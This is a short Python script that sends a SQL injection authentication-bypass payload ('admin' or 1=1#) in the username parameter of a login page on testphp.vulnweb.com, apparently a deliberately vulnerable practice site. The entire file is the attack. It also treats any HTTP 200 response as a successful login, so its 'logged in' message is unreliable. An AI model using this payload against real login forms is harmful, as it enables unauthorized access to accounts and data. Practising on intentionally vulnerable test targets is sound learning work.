import requests

url = "http://testphp.vulnweb.com/login.php"
r = requests.get(url + "?username=admin' or 1=1#&password=password")
if r.status_code == 200:
	print("Welcome Back! You are sucessfully logged in")
	print("Total time took in order to execute your query was " + str(r.elapsed))
else:
	print("Your Username or passward is incorrect")
